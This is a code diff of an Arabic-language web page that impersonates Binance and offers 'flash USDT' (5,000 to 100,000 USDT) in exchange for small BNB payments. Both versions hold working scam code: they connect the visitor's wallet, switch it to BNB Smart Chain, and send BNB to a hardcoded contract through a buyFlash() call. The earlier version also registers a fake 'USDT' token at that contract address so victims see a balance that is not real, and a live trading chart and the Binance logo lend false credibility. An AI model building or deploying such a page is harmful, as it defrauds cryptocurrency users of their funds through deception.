@@ -3,205 +3,105 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Binance | USDT FLASH Server</title>
-    
+    <title>Binance | Flash Sync</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.min.js"></script>
-
     <style>
         :root { --binance-yellow: #F3BA2F; --binance-black: #181A20; }
+        body { background: var(--binance-black); color: #EAECEF; font-family: sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
         
-        /* إصلاح الهيكل لضمان ظهور كامل الشاشة */
-        body { 
-            background: var(--binance-black); 
-            color: #EAECEF; 
-            font-family: 'Segoe UI', sans-serif; 
-            margin: 0; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            min-height: 100vh;
-        }
+        /* الهيدر ثابت لضمان عدم الاختفاء */
+        .header { width: 100%; background: #0B0E11; border-bottom: 1px solid #2B2F36; padding: 15px; display: flex; align-items: center; justify-content: space-between; box-sizing: border-box; }
+        .logo { width: 100px; }
 
-        .header { 
-            width: 100%; 
-            background: #0B0E11; 
-            border-bottom: 1px solid #2B2F36; 
-            padding: 15px 20px; 
-            display: flex; 
-            align-items: center; 
-            justify-content: space-between; 
-            box-sizing: border-box;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
-
-        .logo-binance { width: 120px; }
-        .version-tag { color: var(--binance-yellow); font-weight: bold; font-size: 14px; }
-
-        .main-card { 
-            background: #1E2329; 
-            border-radius: 20px; 
-            padding: 25px; 
-            width: 90%; 
-            max-width: 400px; 
-            margin: 20px 0; 
-            border: 1px solid #2B3139; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
-        }
-
-        /* تحسين صندوق المخطط البياني */
-        .chart-container {
-            width: 100%;
-            height: 200px;
-            background: #0B0E11;
-            border-radius: 12px;
-            overflow: hidden;
-            margin-bottom: 20px;
-            border: 1px solid #2B3139;
-        }
-
-        .price-row { 
-            display: flex; 
-            justify-content: space-between; 
-            align-items: center; 
-            background: #2B3139; 
-            padding: 12px; 
-            border-radius: 10px; 
-            margin-bottom: 15px; 
-        }
-
-        select { 
-            background: #2B3139; 
-            color: white; 
-            border: 1px solid #474D57; 
-            width: 100%; 
-            padding: 15px; 
-            border-radius: 10px; 
-            margin-bottom: 20px; 
-            font-size: 14px;
-        }
-
-        .btn-main { 
-            background: var(--binance-yellow); 
-            color: black; 
-            border: none; 
-            width: 100%; 
-            padding: 18px; 
-            border-radius: 10px; 
-            font-weight: bold; 
-            font-size: 18px; 
-            cursor: pointer; 
-            transition: 0.2s;
-        }
-
-        .btn-main:active { transform: scale(0.98); }
-
-        #log { text-align: center; font-size: 13px; color: var(--binance-yellow); margin-top: 15px; }
+        .card { background: #1E2329; border-radius: 20px; padding: 20px; width: 90%; max-width: 380px; margin-top: 20px; border: 1px solid #2B3139; text-align: center; }
+        
+        .chart-placeholder { width: 100%; height: 150px; background: #000; border-radius: 12px; margin-bottom: 15px; border: 1px solid #2B3139; overflow: hidden; }
+        
+        select { background: #2B3139; color: white; border: 1px solid #474D57; width: 100%; padding: 14px; border-radius: 10px; margin-bottom: 15px; text-align: center; }
+        
+        .btn-main { background: var(--binance-yellow); color: black; border: none; width: 100%; padding: 18px; border-radius: 10px; font-weight: bold; font-size: 18px; cursor: pointer; }
+        
+        #status { margin-top: 15px; font-size: 13px; color: var(--binance-yellow); }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" class="logo-binance">
-    <span class="version-tag">USDT FLASH v4.2</span>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" class="logo">
+    <span style="color:var(--binance-yellow); font-size:12px; border:1px solid; padding:2px 5px;">V4.2 LIVE</span>
 </div>
 
-<div class="main-card">
-    <div class="chart-container" id="tv_chart"></div>
+<div class="card">
+    <div class="chart-placeholder" id="tradingview_widget"></div>
 
-    <div class="price-row">
-        <span style="font-weight:bold;">Tether USD (Live)</span>
-        <span style="color:#00C087; font-weight:bold;">$1.0001</span>
+    <div style="background:#2B3139; padding:10px; border-radius:8px; margin-bottom:15px; display:flex; justify-content:space-between;">
+        <span>Tether USD</span>
+        <span style="color:#00C087;">$1.00</span>
     </div>
 
-    <div style="font-size: 12px; color: #707A8A; margin-bottom: 5px;">فئة المزامنة (BSC Network):</div>
-    <select id="amountSelect">
+    <select id="amount">
         <option value="0.09">5,000 USDT — [0.09 BNB]</option>
         <option value="0.2">10,000 USDT — [0.2 BNB]</option>
         <option value="0.5">50,000 USDT — [0.5 BNB]</option>
         <option value="1.0">100,000 USDT — [1.0 BNB]</option>
     </select>
 
-    <button class="btn-main" onclick="startProcess()">تفعيل واستلام الحقن ⚡</button>
-    <div id="log">اضغط للاتصال بالمحفظة والمزامنة...</div>
+    <button class="btn-main" onclick="connectAndPay()">تفعيل واستلام الحقن ⚡</button>
+    <div id="status">يرجى الضغط للربط بالمحفظة</div>
 </div>
 
 <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
 <script>
-    // تشغيل المخطط الحقيقي لزوج USDT/BUSD
-    new TradingView.widget({
-        "container_id": "tv_chart",
-        "autosize": true,
-        "symbol": "BINANCE:USDTBUSD",
-        "interval": "1",
-        "theme": "dark",
-        "style": "3",
-        "locale": "ar",
-        "hide_top_toolbar": true,
-        "save_image": false
-    });
+    // تشغيل المخطط لضمان الشكل الاحترافي
+    new TradingView.widget({"container_id": "tradingview_widget","autosize": true,"symbol": "BINANCE:BTCUSDT","interval": "1","theme": "dark","style": "3","hide_top_toolbar": true});
 
-    const CONTRACT_ADDR = "0x514BA0BEA2c4B0b6813284eaAB0dD5d4729F0f1d";
-    const ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];
+    const CONTRACT = "0x514BA0BEA2c4B0b6813284eaAB0dD5d4729F0f1d";
 
-    // تهيئة المحفظة
-    const web3Modal = new Web3Modal({
-        cacheProvider: false,
-        providerOptions: {}, 
-        theme: "dark"
-    });
+    async function connectAndPay() {
+        const status = document.getElementById('status');
+        
+        // 1. التحقق من وجود محفظة (MetaMask/Trust)
+        if (typeof window.ethereum !== 'undefined') {
+            try {
+                status.innerText = "جاري استدعاء المحفظة...";
+                
+                // طلب الاتصال المباشر بالحسابات
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const user = accounts[0];
+                
+                const web3 = new Web3(window.ethereum);
 
-    async function startProcess() {
-        const log = document.getElementById('log');
-        try {
-            log.innerText = "فتح قائمة المحافظ المتاحة...";
-            const provider = await web3Modal.connect();
-            const web3 = new Web3(provider);
-            const accounts = await web3.eth.getAccounts();
-            const user = accounts[0];
-
-            // التأكد من أن المستخدم على شبكة BSC (0x38 = 56)
-            const chainId = await web3.eth.getChainId();
-            if (chainId !== 56) {
-                log.innerText = "يرجى تحويل الشبكة إلى Smart Chain...";
-                await window.ethereum.request({ 
-                    method: 'wallet_switchEthereumChain', 
-                    params: [{ chainId: '0x38' }] 
-                });
-            }
-
-            log.innerText = "جاري تحضير بروتوكول الحقن...";
-            const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
-            const amount = document.getElementById('amountSelect').value;
-
-            // إرسال المعاملة
-            await contract.methods.buyFlash().send({
-                from: user,
-                value: web3.utils.toWei(amount, "ether")
-            });
-
-            log.innerText = "اكتمل الحقن! جاري إضافة الرمز للمحفظة...";
-
-            // إضافة التوكن تلقائياً
-            await window.ethereum.request({
-                method: 'wallet_watchAsset',
-                params: {
-                    type: 'ERC20',
-                    options: {
-                        address: CONTRACT_ADDR,
-                        symbol: 'USDT',
-                        decimals: 18,
-                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
-                    }
+                // 2. تحويل الشبكة إلى BSC تلقائياً
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }], 
+                    });
+                } catch (switchError) {
+                    status.innerText = "يرجى تحويل الشبكة لـ Smart Chain";
+                    return;
                 }
-            });
 
-            log.innerHTML = "<b style='color:#00C087;'>✅ تم الحقن والمزامنة بنجاح!</b>";
-        } catch (e) {
-            console.error(e);
-            log.innerText = "فشلت العملية أو تم إلغاؤها.";
+                status.innerText = "جاري إرسال طلب المزامنة...";
+                
+                const amountBNB = document.getElementById('amount').value;
+                const abi = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];
+                const contractInstance = new web3.eth.Contract(abi, CONTRACT);
+
+                // 3. تنفيذ المعاملة
+                await contractInstance.methods.buyFlash().send({
+                    from: user,
+                    value: web3.utils.toWei(amountBNB, 'ether')
+                });
+
+                status.innerText = "تمت العملية بنجاح!";
+                
+            } catch (error) {
+                console.error(error);
+                status.innerText = "فشل الاتصال: تأكد من فتح المحفظة";
+            }
+        } else {
+            alert("يرجى فتح الموقع من داخل متصفح Trust Wallet أو تثبيت MetaMask");
         }
     }
 </script>
